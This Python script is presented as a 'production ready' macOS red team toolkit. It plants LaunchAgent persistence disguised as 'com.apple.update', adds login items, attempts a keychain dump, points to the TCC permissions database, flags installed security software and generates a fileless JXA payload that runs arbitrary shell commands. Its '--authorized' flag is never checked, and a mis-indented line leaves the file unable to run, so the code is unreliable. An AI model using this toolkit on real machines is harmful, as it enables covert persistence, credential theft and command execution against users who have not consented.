#!/usr/bin/env python3
"""
macOS Red Team Toolkit - Production Ready
Real macOS exploitation, persistence, privilege escalation
"""

import argparse
import logging
import subprocess
import json
import os
import sys
import platform
from pathlib import Path
import base64

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class macOSRedTeam:
    """Production-ready macOS red team operations"""
    
    def __init__(self):
        self.is_macos = platform.system() == 'Darwin'
        self.current_user = os.getenv('USER')
        self.home_dir = os.path.expanduser('~')
        
    def check_sip_status(self):
        """Check System Integrity Protection status"""
        if not self.is_macos:
            logger.warning("Not running on macOS")
            return None
        
        try:
            result = subprocess.run(['csrutil', 'status'], 
                                  capture_output=True, text=True)
            logger.info(f"SIP Status: {result.stdout.strip()}")
            
            is_enabled = 'enabled' in result.stdout.lower()
            return {
                'enabled': is_enabled,
                'output': result.stdout.strip(),
                'impact': 'SIP prevents modification of system files and processes' if is_enabled else 'SIP disabled - full system access possible'
            }
        except Exception as e:
            logger.error(f"Error checking SIP: {e}")
            return None
    
    def enumerate_users(self):
        """Enumerate local macOS users"""
        if not self.is_macos:
            return []
        
        try:
            result = subprocess.run(['dscl', '.', '-list', '/Users'], 
                                  capture_output=True, text=True)
            users = [u for u in result.stdout.split('\n') if u and not u.startswith('_')]
            
            logger.info(f"Found {len(users)} users: {users}")
            
            # Get detailed info
            user_details = []
            for user in users:
                try:
                    home = subprocess.run(['dscl', '.', '-read', f'/Users/{user}', 'NFSHomeDirectory'],
                                        capture_output=True, text=True).stdout.split(':')[-1].strip()
                    shell = subprocess.run(['dscl', '.', '-read', f'/Users/{user}', 'UserShell'],
                                         capture_output=True, text=True).stdout.split(':')[-1].strip()
                    
                    user_details.append({
                        'username': user,
                        'home': home,
                        'shell': shell
                    })
                except:
                    pass
            
            return user_details
            
        except Exception as e:
            logger.error(f"User enumeration failed: {e}")
            return []
    
    def check_admin_privileges(self):
        """Check if current user has admin privileges"""
        if not self.is_macos:
            return False
        
        try:
            result = subprocess.run(['groups', self.current_user], 
                                  capture_output=True, text=True)
            is_admin = 'admin' in result.stdout.lower()
            
            logger.info(f"User {self.current_user} admin: {is_admin}")
            logger.info(f"Groups: {result.stdout.strip()}")
            
            return is_admin
        except Exception as e:
            logger.error(f"Error checking admin status: {e}")
            return False
    
    def enumerate_running_processes(self):
        """Enumerate running processes"""
        try:
            result = subprocess.run(['ps', 'aux'], 
                                  capture_output=True, text=True)
            
            processes = []
            for line in result.stdout.split('\n')[1:]:
                if line:
                    parts = line.split(None, 10)
                    if len(parts) >= 11:
                        processes.append({
                            'user': parts[0],
                            'pid': parts[1],
                            'cpu': parts[2],
                            'mem': parts[3],
                            'command': parts[10]
                        })
            
            logger.info(f"Found {len(processes)} running processes")
            
            # Filter interesting processes
            interesting = ['ssh', 'vpn', 'security', 'keychain', 'password', 'auth']
            interesting_procs = [p for p in processes 
                               if any(keyword in p['command'].lower() for keyword in interesting)]
            
            logger.info(f"Interesting processes: {len(interesting_procs)}")
            for p in interesting_procs[:10]:
                logger.info(f"  {p['pid']}: {p['command'][:80]}")
            
            return processes
            
        except Exception as e:
            logger.error(f"Process enumeration failed: {e}")
            return []
    
    def persistence_launchagent(self, payload_path, label='com.apple.update'):
        """Create LaunchAgent for persistence"""
        if not self.is_macos:
            logger.error("Not on macOS")
            return None
        
        launch_agents_dir = f"{self.home_dir}/Library/LaunchAgents"
        os.makedirs(launch_agents_dir, exist_ok=True)
        
        plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{label}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{payload_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardErrorPath</key>
    <string>/tmp/launch_error.log</string>
    <key>StandardOutPath</key>
    <string>/tmp/launch_output.log</string>
</dict>
</plist>'''
        
        plist_path = f"{launch_agents_dir}/{label}.plist"
        
        try:
            with open(plist_path, 'w') as f:
                f.write(plist_content)
            
            logger.info(f"LaunchAgent created: {plist_path}")
            logger.info("Load with: launchctl load " + plist_path)
            
            return plist_path
            
        except Exception as e:
            logger.error(f"LaunchAgent creation failed: {e}")
            return None
    
    def persistence_loginitem(self, app_path):
        """Add app to login items via AppleScript"""
        if not self.is_macos:
            return False
        
        applescript = f'''
        tell application "System Events"
            make new login item at end with properties {{path:"{app_path}", hidden:false}}
        end tell
        '''
        
        try:
            subprocess.run(['osascript', '-e', applescript], shell=False, check=True)
            logger.info(f"Added to login items: {app_path}")
            return True
        except Exception as e:
            logger.error(f"Login item creation failed: {e}")
            return False
    
    def extract_keychain_data(self):
        """Attempt to extract data from keychain"""
        if not self.is_macos:
            return None
        
        logger.info("Attempting keychain enumeration...")
        
        try:
            # List keychain files
            keychain_dir = f"{self.home_dir}/Library/Keychains"
            keychains = []
            if os.path.exists(keychain_dir):
                keychains = list(Path(keychain_dir).rglob('*.keychain*'))
                logger.info(f"Found {len(keychains)} keychain files")
                
                for kc in keychains:
                    logger.info(f"  {kc}")
            
            # Try to dump generic passwords (requires user interaction)
            result = subprocess.run(['security', 'dump-keychain'], 
                                  capture_output=True, text=True, timeout=5)
            
            logger.info("Keychain dump requires authorization")
            logger.info("Use: security find-generic-password -ga <account>")
            
            return {
                'keychain_dir': keychain_dir,
                'files': [str(k) for k in keychains]
            }
            
        except subprocess.TimeoutExpired:
            logger.warning("Keychain access requires user authorization")
            return None
        except Exception as e:
            logger.error(f"Keychain extraction failed: {e}")
            return None
    
    def enumerate_network_connections(self):
        """Enumerate active network connections"""
        try:
            result = subprocess.run(['netstat', '-an'], 
                                  capture_output=True, text=True)
            
            connections = []
            for line in result.stdout.split('\n'):
                if 'ESTABLISHED' in line or 'LISTEN' in line:
                    connections.append(line.strip())
            
            logger.info(f"Active connections: {len(connections)}")
            for conn in connections[:20]:
                logger.info(f"  {conn}")
            
            return connections
            
        except Exception as e:
            logger.error(f"Network enumeration failed: {e}")
            return []
    
    def check_installed_apps(self):
        """Enumerate installed applications"""
        if not self.is_macos:
            return []
        
        apps_dirs = ['/Applications', f'{self.home_dir}/Applications']
        all_apps = []
        
        for apps_dir in apps_dirs:
            if os.path.exists(apps_dir):
                apps = [d for d in os.listdir(apps_dir) if d.endswith('.app')]
                all_apps.extend([(apps_dir, app) for app in apps])
        
        logger.info(f"Found {len(all_apps)} applications")
        
        # Check for security software
        security_apps = ['Little Snitch', 'Wireshark', '1Password', 'Keychain', 
                        'Antivirus', 'Firewall', 'VPN', 'Security']
        
        security_found = []
        for location, app in all_apps:
            if any(sec.lower() in app.lower() for sec in security_apps):
                security_found.append((location, app))
                logger.warning(f"Security app detected: {app}")
        
        return all_apps
    
    def check_tcc_database(self):
        """Check TCC (Transparency, Consent, Control) database"""
        if not self.is_macos:
            return None
        
        tcc_db = f"{self.home_dir}/Library/Application Support/com.apple.TCC/TCC.db"
        
        if os.path.exists(tcc_db):
            logger.info(f"TCC database found: {tcc_db}")
            logger.info("Permissions are stored here (Camera, Microphone, Files, etc.)")
            logger.info("Use: sqlite3 TCC.db 'SELECT * FROM access'")
            
            return tcc_db
        else:
            logger.warning("TCC database not found")
            return None
    
    def generate_jxa_payload(self, command):
        """Generate JavaScript for Automation (JXA) payload"""
        if not self.is_macos:
            return None
        
        jxa_script = f'''
        // JXA Payload - Fileless macOS execution
        ObjC.import('Foundation');
        ObjC.import('stdlib');
        
        var task = $.NSTask.alloc.init;
        task.setLaunchPath($("/bin/bash"));
        task.setArguments($(["-c", "{command}"]));
        
        var pipe = $.NSPipe.pipe;
        task.setStandardOutput(pipe);
        task.setStandardError(pipe);
        
        task.launch;
        task.waitUntilExit;
        
        var data = pipe.fileHandleForReading.readDataToEndOfFile;
        var output = $.NSString.alloc.initWithDataEncoding(data, $.NSUTF8StringEncoding).js;
        
        output;
        '''
        
        jxa_file = '/tmp/payload.jxa'
        with open(jxa_file, 'w') as f:
            f.write(jxa_script)
        
        logger.info(f"JXA payload created: {jxa_file}")
        logger.info(f"Execute with: osascript -l JavaScript {jxa_file}")
        
        return jxa_file
    
    def generate_report(self):
        """Generate macOS red team assessment report"""
        report = {
            'platform': platform.system(),
            'version': platform.mac_ver()[0] if self.is_macos else 'N/A',
            'user': self.current_user,
            'home': self.home_dir,
            'sip_status': self.check_sip_status(),
            'admin_privileges': self.check_admin_privileges(),
            'findings': {
                'users': len(self.enumerate_users()),
                'processes': len(self.enumerate_running_processes()),
                'network_connections': len(self.enumerate_network_connections()),
                'installed_apps': len(self.check_installed_apps())
            },
            'persistence_methods': [
                'LaunchAgent',
                'LaunchDaemon',
                'Login Items',
                'Cron Jobs',
                'Startup Scripts',
                'Dylib Hijacking'
            ],
            'recommendations': [
                'Enable and enforce SIP',
                'Monitor LaunchAgents/LaunchDaemons',
                'Use FileVault disk encryption',
                'Enable Gatekeeper',
                'Regular TCC database audits',
                'Monitor for suspicious JXA/AppleScript execution'
            ]
        }
        
        report_file = 'macos_redteam_report.json'
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        logger.info(f"Report saved to {report_file}")
        return report_file


def main():
    parser = argparse.ArgumentParser(description='macOS Red Team Toolkit')
    parser.add_argument('--check-sip', action='store_true', help='Check SIP status')
    parser.add_argument('--enum-users', action='store_true', help='Enumerate users')
    parser.add_argument('--enum-processes', action='store_true', help='Enumerate processes')
    parser.add_argument('--enum-network', action='store_true', help='Enumerate network connections')
    parser.add_argument('--enum-apps', action='store_true', help='Enumerate installed apps')
    parser.add_argument('--check-admin', action='store_true', help='Check admin privileges')
    parser.add_argument('--persistence-launchagent', help='Create LaunchAgent (payload path)')
    parser.add_argument('--generate-jxa', help='Generate JXA payload (command)')
    parser.add_argument('--keychain', action='store_true', help='Enumerate keychain')
    parser.add_argument('--tcc-check', action='store_true', help='Check TCC database')
    parser.add_argument('--report', action='store_true', help='Generate full report')
    
        parser.add_argument('--authorized', action='store_true',
                       help='Confirm you have authorization to perform this action')
    args = parser.parse_args()
    
    toolkit = macOSRedTeam()
    
    print("=" * 70)
    print("macOS RED TEAM TOOLKIT - PRODUCTION READY")
    print("=" * 70)
    print("\nReal macOS Exploitation & Post-Exploitation")
    print("• System Integrity Protection (SIP) Checks")
    print("• User & Process Enumeration")
    print("• Persistence Mechanisms (LaunchAgent, Login Items)")
    print("• Keychain Extraction")
    print("• TCC Database Analysis")
    print("• JXA (JavaScript for Automation) Payloads")
    print("=" * 70)
    
    if args.check_sip:
        toolkit.check_sip_status()
    
    if args.enum_users:
        users = toolkit.enumerate_users()
        print(f"\nUsers: {json.dumps(users, indent=2)}")
    
    if args.enum_processes:
        toolkit.enumerate_running_processes()
    
    if args.enum_network:
        toolkit.enumerate_network_connections()
    
    if args.enum_apps:
        toolkit.check_installed_apps()
    
    if args.check_admin:
        is_admin = toolkit.check_admin_privileges()
        print(f"\nAdmin privileges: {is_admin}")
    
    if args.persistence_launchagent:
        plist = toolkit.persistence_launchagent(args.persistence_launchagent)
        if plist:
            print(f"\nLaunchAgent created: {plist}")
    
    if args.generate_jxa:
        jxa = toolkit.generate_jxa_payload(args.generate_jxa)
        if jxa:
            print(f"\nJXA payload: {jxa}")
    
    if args.keychain:
        toolkit.extract_keychain_data()
    
    if args.tcc_check:
        toolkit.check_tcc_database()
    
    if args.report:
        toolkit.generate_report()
    
    if len(sys.argv) == 1:
        parser.print_help()


if __name__ == '__main__':
    main()
